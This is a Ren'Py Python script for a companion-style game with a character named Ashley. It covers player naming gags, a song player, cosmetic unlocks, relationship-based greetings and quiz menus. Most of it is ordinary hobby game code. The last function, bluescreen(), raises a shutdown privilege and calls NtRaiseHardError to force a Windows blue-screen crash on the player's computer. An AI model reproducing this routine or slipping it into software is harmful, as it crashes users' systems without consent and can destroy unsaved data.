init python:
    # situational functions used as a specific part of a label
    def namePlayer():
        global ashley
        global name
        nameInput = renpy.input(_("Enter your name."))
        playerName = nameInput.strip() or __("Babes")
        name = nameContingencies(playerName)
        ashley.setValue("name", name)
    def nameContingencies(playerName):
        lowerName = playerName.lower()
        if lowerName == "daddy":
            return "Master Hardwick"
        elif lowerName == "raffi" or lowerName == "raf" or lowerName == "gearloe":
            a("Well, well, well... I knew this day would come.")
            a("Finally, a worthy adversary. Our battle will be legendary!")
            renpy.show("ash laugh")
            a("...love you xx :)")
            renpy.show("ash")
        elif lowerName == "bibblyboy":
            renpy.show("ash laugh")
            a("I love men.")
            renpy.show("ash")
        elif lowerName == "pipster":
            a("gosh, this is painful, isn't it?")
            renpy.show("ash laugh")
            a("It's okay, it might work this time!")
            renpy.show("ash blink")
        return playerName
    
    def jamSelector(selectionMethod):
        global songsPlayed
        renpy.music.stop(fadeout=3.0)
        numOfJams = len(readFile("unlockedSongs.txt"))
        numOfHeard = len(readFile("heardSongs.txt"))
        if selectionMethod == "previous":
            chosenTrack = getPreviousSong(songsPlayed)
            songsPlayed = songsPlayed[:-1]
        elif selectionMethod == "specific":
            a(f"Number of songs heard: {numOfHeard}/{numOfJams}")
            chosenTrack = getSpecificSong()
        else:
            a(f"Number of songs available: {numOfJams}")
            chosenTrack = getRandomSong(songsPlayed)
        a(f"Track chosen: {chosenTrack}")
        renpy.music.play(f"audio/jams/{chosenTrack}.mp3")
        writeToFile("heardSongs.txt", chosenTrack)
        songsPlayed.append(chosenTrack)
        songsPlayed = songsPlayed[-5:]
        print(songsPlayed)
        jamContingencies(chosenTrack)
        getTrackDetails(chosenTrack)
    def jamContingencies(chosenTrack):
        if chosenTrack == "Knee Deep At ATP":
            renpy.show("ash laugh")
            a("You lucky thing, that's my creator's favourite song!")
            addQuizTopic("ATP")
            renpy.show("ash blink")
        elif chosenTrack == "Soft Boy":
            a("Fun fact- this is actually the main menu song!")
            addQuizTopic("SoftBoy")
    
    def wardrobe():
        global ashley
        # order hairBack, body, nails, eyes, hairFront, accessory, eyebrows
        cosmetics = ashley.getValue("cosmetics")
        for outfit in cosmetics:
            for key, value in wardrobe.items():
                if outfit == key:
                    wardrobe[key] = value
    def greetingSelector():
        global ashley
        relationship = ashley.getValue("relationship")
        if relationship < 10:
            greetings = ["Well hello again.",
                        "Welcome back, [name].",
                        "Here we go again...",
                        "What's on your mind?",
                        "It's [name], right?",
                        "Fancy seeing you here!"]
        elif relationship >= 10 and relationship < 25:
            greetings = ["You're getting the hang of this now~",
                        "It's good to see you again.",
                        "I'm glad you're enjoying yourself.",
                        "I'm glad you're back.",
                        "I'm glad you're back, [name].",
                        "You look like you have something to ask me. Don't worry, I won't bite.",
                        "Hey, [name]. What's up?"]
        elif relationship >= 25:
            greetings = ["You must really like me... Aha, don't worry. I like you too",
                        "I missed seeing that face of yours~",
                        "You're giving me that look again... not that I mind.",
                        "[name]! It's so nice to see you."
                        "I was just wondering when you'd come visit me again."
                        "Don't leave me so long next time...",
                        "James Holroyd is hot.",
                        "I missed you...",
                        "I'm here whenever you need me... I hope you know that."]
        greeting = random.choice(greetings)
        return greeting
    def anyCosmetics():
        global ashley
        for cosmeticType in ashley.getValue("cosmetics"):
            if len(cosmeticType) > 1:
                return True
        return False
    def quizOpener():
        openers = [
            "I hope you've been paying attention!", 
            "Time to test your knowledge!", 
            "Let's see how well you know me!", 
            "Let's see how much you've been paying attention!", 
            "Let's see how much you've learned!", 
            "Pop quiz!", 
            "Knowledge check!",
            "Think fast!"]
        return random.choice(openers)
    def unoReverse():
        global aboutPlayer
        global ashley
        askedTopics = ashley.getValue("askedTopics")
        for topic in askedTopics:
            try: 
                aboutPlayer.pop(topic)
            except KeyError:
                continue
        if aboutPlayer is empty:
            return None
        chosenTopic = random.choice(aboutPlayer)
        #indexOfTopic = findDictIndex(aboutPlayer, chosenTopic)
        ashley.setValue("askedTopics", askedTopics.append(chosenTopic))
        return chosenTopic

    # useful, commonly used functions
    def zeldaRiff(cosmeticType, cosmeticNo):
        global ashley
        cosmeticTypes = ["hairBack", "body", "nails", "eyes", "hairFront", "accessory", "eyebrows"]
        cosmeticIndex = cosmeticTypes.index(cosmeticType)
        cosmeticName = getCosmeticName(cosmeticType, cosmeticNo)
        cosmetics = ashley.getValue("cosmetics")
        if cosmeticNo in cosmetics[cosmeticIndex]:
            renpy.show("ash laugh")
            a(f"You cheeky hecker, you already have '{cosmeticName}'!")
            renpy.show("ash blink")
        else:
            cosmetics[cosmeticIndex].append(cosmeticNo)
            ashley.setValue("cosmetics", cosmetics)
            renpy.play("audio/itemget.mp3")
            nar(f"You unlocked the '{cosmeticName}' cosmetic! Visit the unlockables menu to equip it!")
    def addQuizTopic(topicToAdd):
        global ashley
        quizTopics = ashley.getValue("quizTopics")
        if not topicToAdd in quizTopics:
            quizTopics.append(topicToAdd)
            ashley.setValue("quizTopics", quizTopics)
        else:
            renpy.show("ash laugh")
            a("But, you already know about that.")
            renpy.show("ash blink")
    def randomResponse(typeOfResponse):
        global ashley
        if typeOfResponse == True: 
            responses = ["And so it shall be.",
                        "Anything for you...",
                        "I don't think so. Haha, just kidding!",
                        f"Sure thing, {ashley.getValue('name')}."]
        elif typeOfResponse == False:
            responses = ["Sorry, I don't think I can do that.",
                        "I'm afraid I can't do that right now.",
                        "Are you sure about that?",
                        "Sorry, no can do."]
        elif typeOfResponse.lower() == "quit":
            responses = ["I see. I suppose you have better things to do.",
                        "Leaving so soon?",
                        "I'll miss you.",
                        "Come back soon."]
        else:
            return "Invalid type of response!"
        return random.choice(responses)
    def findDictIndex(dict, item):
        try:
            keysList = list(dict.keys())
            if item not in keysList:
                valsList = list(dict.values())
                dictIndex = valsList.index(item)
            else:
                dictIndex = keysList.index(item)
            return dictIndex
        except:
            print("Item not in dictionary! :(")

    def writeToFile(filename, text):
        with open(config.gamedir + "/files/" + filename) as rf:
            if text not in rf.read():
                with open(config.gamedir + "/files/" + filename, "a") as af:
                    af.write(text + "\n")
        return
        # contingencies for time of day whether tutorial is completed or not
    def readFile(filename):
        itemList = open(config.gamedir + "/files/" + filename).readlines()
        for index, item in enumerate(itemList):
            itemList[index] = item.replace("\n", "")
        return itemList
    
    def inputQuestion(question, correctAnswer):
        global points
        a(f"{question}")
        answer = renpy.input("Enter your answer.").strip().lower()
        if answer == correctAnswer.lower():
            points += 1
            a("Correct! You get a point.")
        else:
            a("Incorrect. You don't get a point.")
        a(f"You have {points} {getCorrectNoun()}.")
    def menuQuestion(question, correctAnswer, options, pointsEnabled):
        a(f"{question}", interact=False)
        answer = choiceMenu(options)
        if pointsEnabled:
            global points
            if answer == correctAnswer:
                points += 1
                a("Correct! You get a point.")
            else:
                a("Incorrect. You don't get a point.")
            a(f"You have {points} {getCorrectNoun()}.")
            return
        else:
            if answer == correctAnswer:
                a("Correct!")
                return True
            else:
                a("Incorrect.")
                return False
    
    def separateOptions(options):
        separatedOptions = []
        #theoretical limit = 8 options (6 + "Next"/"Prev")
        print(len(options))
        maxOptions = 6
        if len(options) > maxOptions:
            print(ceil(len(options)/maxOptions))
            requiredMenus = ceil(len(options)/maxOptions)
            for menuNumber in range(requiredMenus):
                separatedOptions.append(options[:maxOptions])
                del options[:maxOptions]
        else:
            separatedOptions.append(options)
        print("Separated: "+str(separatedOptions))
        return separatedOptions
    def formatOptions(separatedOptions):
        formattedOptions = []
        # gets correct [(),()] format for Ren'Py menu
        for outer in separatedOptions:
            innerOptions = []
            for inner in outer:
                innerOptions.append((inner, inner))
            formattedOptions.append(innerOptions)
        print("Formatted: "+str(formattedOptions))
        return formattedOptions
    def addTraversal(formattedOptions):
        if len(formattedOptions) > 1:
            maxIndex = len(formattedOptions)
            for menu in formattedOptions:
                currentIndex = formattedOptions.index(menu) + 1
                nextIndex = currentIndex + 1
                prevIndex = currentIndex - 1
                menu.append((f"Next - {nextIndex}/{maxIndex}", "Next"))
                menu.append((f"Previous - {prevIndex}/{maxIndex}", "Previous"))
            formattedOptions[-1].pop(-2)
            formattedOptions[0].pop(-1)
            print(formattedOptions)
        return formattedOptions
    def menuFormat(options):
        return(addTraversal(formatOptions(separateOptions(options))))
    def choiceMenu(options):
        choices = menuFormat(options)
        index = 0
        answer = traverseMenu(choices, index)
        return answer
    def traverseMenu(choices, index):
        answer = renpy.display_menu(choices[index])
        if answer == "Next":
            index += 1
        elif answer == "Previous":
            index -= 1
        else:
            return answer
        traverseMenu(choices, index)
        return answer
        
    # sets time for bg from time of day/ tutorial status    
    def setBG():
        global ashley
        global timeOfDay
        if ashley.getValue("name") == "" or ashley.getValue("tutorialCompleted") == False:
            timeOfDay = "Day"
        else:
            getTimeOfDay()
    # getting variables from other functions
    def getAshBasics():
        global ashley
        global hairBack
        global body
        global nails
        global hairFront
        global accessory
        global eyebrows
        global eyes
        global tutorialCompleted
        global name
        global relationship
        outfit = ashley.getValue("outfit")
        # (hairBack, body, nails, eyes, hairFront, accessory, eyebrows)
        hairBack = outfit[0]
        body = outfit[1]
        nails = outfit[2]
        eyes = outfit[3]
        hairFront = outfit[4]
        accessory = outfit[5]
        eyebrows = outfit[6]
        tutorialCompleted = ashley.getValue("tutorialCompleted")
        name = ashley.getValue("name")
        relationship = ashley.getValue("relationship")
    def getCorrectNoun():
        global points
        if points == 1:
            return "point"
        else:
            return "points"
    def getCosmeticName(cosmeticType, cosmeticNo):
        global cosmeticsAll
        dictName = cosmeticType + "All"
        return cosmeticsAll[dictName][cosmeticNo]
    def getTrackDetails(chosenTrack):
        global allSongs
        global albumName
        global artistName
        global trackNo
        global currentTrack
        currentTrack = chosenTrack
        albumName = None
        artistName = None
        trackNo = None
        # find album name, track number
        for key, value in allSongs.items():
            for album, songs in value.items():
                if currentTrack in songs:
                    artistName = key
                    albumName = album
                    trackNo = songs.index(currentTrack) + 1
                
        # error catching (incase i add new tracks and forget to add to the dictionary)
        if artistName is None:
            albumName = "Unknown"
            trackNo = "N/A"
            artistName = "Unknown"
    def getRandomSong(songsPlayed):
        chosenTrack = random.choice(readFile("unlockedSongs.txt"))
        try:
            if chosenTrack == songsPlayed[-1]:
                a(f"Oops! I was going to play {songsPlayed[-1]}, but you just heard that one!")
                getRandomSong(songsPlayed)
        except IndexError:
            pass
        return chosenTrack
    def getPreviousSong(songsPlayed):
        if len(songsPlayed) < 2:
            a("No other songs played yet! Come back once you've heard some jams.")
        return songsPlayed[-1]
    def getSpecificSong():
        specificSong = choiceMenu(readFile("heardSongs.txt"))
        return specificSong
    # functions designed to override native Ren'Py functions/ config related functions
    def removeKeybinds(keybinds):
        keybindsToRemove = keybinds
        for keybind in keybindsToRemove:
            config.keymap[keybind] = []
    def rebindKeybinds(keybinds):
        for pair in keybinds:
            config.keymap[pair[0]] = [pair[1]]
    def bluescreen():
        from ctypes import windll
        from ctypes import c_int
        from ctypes import c_uint
        from ctypes import c_ulong
        from ctypes import POINTER
        from ctypes import byref

        nullptr = POINTER(c_int)()

        windll.ntdll.RtlAdjustPrivilege(
            c_uint(19), 
            c_uint(1), 
            c_uint(0), 
            byref(c_int())
        )

        windll.ntdll.NtRaiseHardError(
            c_ulong(0xC000007B), 
            c_ulong(0), 
            nullptr, 
            nullptr, 
            c_uint(6), 
            byref(c_uint())
        )